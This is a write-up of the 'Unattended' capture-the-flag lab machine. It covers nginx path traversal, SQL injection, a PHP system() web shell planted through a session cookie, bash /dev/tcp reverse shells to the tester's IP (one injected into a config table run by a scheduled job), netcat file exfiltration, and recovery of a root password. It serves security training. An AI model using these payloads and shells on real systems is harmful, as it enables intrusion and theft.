# Unattended

This is the write-up for the box Unattended that got retired at the 24th August 2019.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.126    unattended.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/unattended.nmap 10.10.10.126
```

```markdown
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
| Not valid before: 2018-12-19T09:43:58
|_Not valid after:  2021-09-13T09:43:58
```

Adding **nestedflanders.htb** to my hosts file.

## Checking HTTP and HTTPS

Browsing to both sites with the IP address gives us a blank page and browsing to **www[.]nestedflanders.htb** gives us the default Apache2 page.
We will run _gobuster_ against this to get any directories:
```markdown
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://10.10.10.126/
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u https://10.10.10.126/ -k
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://www.nestedflanders.htb -k
```

The pages with SSL need the _-k_ parameter to skip SSL verification. We get the following directories:
- /.htacces
- /.hta
- /.htpasswd
- /dev
- index.html
- index.php

All of them give us the HTTP code _403 Forbidden_ except for **/dev** that gives us a _301 Moved Temporarily_ and says:
> dev site has been moved to his own server

On **index.php** we find a real web page with more information.

```markdown
### main (/index.php?id=25)
Hello visitor,
we are very sorry to show you this ridiculous page but we had to restore our website to 2001-layout.
As a partial recover, we offer you a printed portfolio: just drop us an email with a contact request. 

### about (/index.php?id=465)
Hello visitor,
our Company is world wide leading expert about Nesting stuff.
We can nest almost everything after or before anything based on your needs.
Feel free to contact us with usual email addresses, our contact form is currently offline because of a recent attack. 

### contact (/index.php?id=587)
Hello visitor,
thanks for getting in touch with us!
Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.
Please come back later.
```

The most interesting about this, is that those 3 pages all have a different value in the _id_ query.
This page gets confused when we put a trailing _single quote_ at the end of the query:
```markdown
hxxps://www.nestedflanders.htb/index.php?id=465'
```

This brings us back to to the main page so we definitely got a **SQL Injection** here.

When we examine the _/dev_ directory in Burpsuite we can see it adds a trailing slash at the end of the path and that is the location were we are redirected.
As we know that this is nginx, we can abuse a misconfiguration that [breaks the parser logic](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) of that.
In short it looks like this:
```markdown
GET /dev../html/index.php 
```

And this gives us the source code of **index.php**. This file can be found in this repository as it has important information.
- $username = "nestedflanders";
- $password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
- include "6fb17817efb4131ae4ae1acae0f7fd48.php";
  - /* removed everything because of undergoing investigation, please check dev and staging */
  - Sending every cookie into our session

We will abuse **6fb17817efb4131ae4ae1acae0f7fd48.php** to execute PHP code for us on the server.

### SQL Injection

If we try out some SQLi we find out that we get different responses with **UNION Injections**. For example like this, we get no content on the page:
```markdown
GET /index.php?id=465'+union+select+1--+-
```

Lets send the request to SQLMap:
```markdown
GET /index.php?id=465 HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=pj052g0hbe1jsbslvn86d0bg51
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
```markdown
sqlmap -r id.req -p id --batch

sqlmap -r id.req -p id --batch --dbs
- We get the table neddy (that we also can find in the source code)

sqlmap -r id.req -p id --batch -D neddy --tables
```

We got the tables from SQLMap:
```markdown
+--------------+
| config       |
| customers    |
| employees    |
| filepath     |
| idname       |
| offices      |
| orderdetails |
| orders       |
| payments     |
| productlines |
| products     |
+--------------+
```

### Getting Code Execution

Now that we know how our SQL Injection has to look like we are combining that with the flaw in **6fb17817efb4131ae4ae1acae0f7fd48.php** file to get command execution.

We need to find out the path where PHP stores its sessions. This can be found by searching the internet and trying all the paths. In this case it was found in _/var/lib/php/sessions/_. The name of the cookie obviously varies.

```markdown
GET /index.php?testquery=whoami&id=587'+union+select+"1'+union+select+'/var/lib/php/sessions/sess_so39f3vkekuiop1sanumspvt93'--+-"--+- HTTP/1.1
Host: www.nestedflanders.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.nestedflanders.htb/index.php?id=465
Cookie: PHPSESSID=so39f3vkekuiop1sanumspvt93; Test=<?php system($_GET['testquery']) ?>
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

This responses with the web page and gives us the output of _whoami_ and we are www-data:
```markdown
(...)
<!-- <div align="center"> -->
PHPSESSID|s:26:"so39f3vkekuiop1sanumspvt93";Test|s:35:"www-data
";<!-- </div> -->
(...)
```

Now we can get a Bash reverse shell by replacing _whoami_ with:
```markdown
bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'
```

## Privilege Escalation

When we want to upgrade our shell with Pythons pty module, we will see that there is no Python installed on the server. Instead we can use the _script_ command:
```markdown
script -qc /bin/bash /dev/null
```

We got the password of the MySQL database from the _index.php_ file and we know there are a lot of different tables there, so we will look into that.
```markdown
mysql -u nestedflanders -D neddy -p
```

Looking at the tables we see the same as SQLMap enumerated for us:
```markdown
show tables;

+-----------------+
| Tables_in_neddy |
+-----------------+
| config          |
| customers       |
| employees       |
| filepath        |
| idname          |
| offices         |
| orderdetails    |
| orders          |
| payments        |
| productlines    |
| products        |
+-----------------+
```

If we look at the **config** table we find some interesting things:
```markdown
select * from config;

+-----+-------------------------+--------------------------------------------------------------------------+                                                                                               
| id  | option_name             | option_value                                                             |                                                                                               
+-----+-------------------------+--------------------------------------------------------------------------+
|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
+-----+-------------------------+--------------------------------------------------------------------------+
```

This looks like it automatically executes a perl script in some intervals. If we replace this with another reverse shell, we should have escalated our privileges to the _guly_ user.

```markdown
update config set option_value = "bash -c 'bash -i >& /dev/tcp/10.10.14.4/80 0>&1'" where id = '86';
```

This updates the value to our reverse shell and our listener gets a callback after some seconds and we are the user _guly_ on it!

### Privilege Escalation to root

We should run a Linux Enumerator script on this machine like _LinEnum.sh_. After running that, the following information are interesting:
- User _guly_ is member of group **grub**
- /dev/mapper/sda2_crypt

This could be a hint to modify grub in order to encrypt this special drive. Looking for files that the group **grub** owns:
```markdown
find / -group grub -ls 2>/dev/null
```

We get one file **/boot/initrd.img-4.9.0-8-amd64** and download this to our local machine to examine it:
```markdown
On client: nc -lvnp 80 > initrd.img

On box: cat /boot/initrd.img-4.9.0-8-amd64 > /dev/tcp/10.10.14.4/80
```

It is a **gzip** compressed file that we can encrypt:
```markdown
zcat initrd.img | cpio -idmv
```

And now we get a file structure from a / folder. We should narrow our target down by looking for files between the creation date  of the SSL file (19-12-2018) and two days after:
```markdown
find . -type f -newermt 2018-12-19 ! -newermt 2018-12-21 -ls
```

As we want to decrypt something there are displayed two files that could be interesting:
- /scripts/local-top/cryptroot

In this script we find that **/sbin/uinitrd c0m3s3f0ss34nt4n1** gets executed and this is not a standard binary so we execute it from the path, too and get the output:
> supercazzola

After trying to authenticate with this it fails, so we want to run that binary directly on the box but we see that only root can execute it.

#### Analyzing the binary

If we analyze this binary with **strace** we can see that the binary reads the following files:
- open("/etc/hostname", O_RDONLY)
- open("/boot/guid", O_RDONLY)

Replacing the contents of these files on our client with the contents of the img file:
```markdown
/boot/guid: C0B604A4-FE6D-4C14-A791-BEB3769F3FBA
/etc/hostname: unattended
```

And then we run **./sbin/uinitrd c0m3s3f0ss34nt4n1** again and get the following output:
> 132f93ab100671dcb263acaf5dc95d8260e8b7c6

If we try to _su -_ with the _guly_ user with this password, the authentication works and we are root!
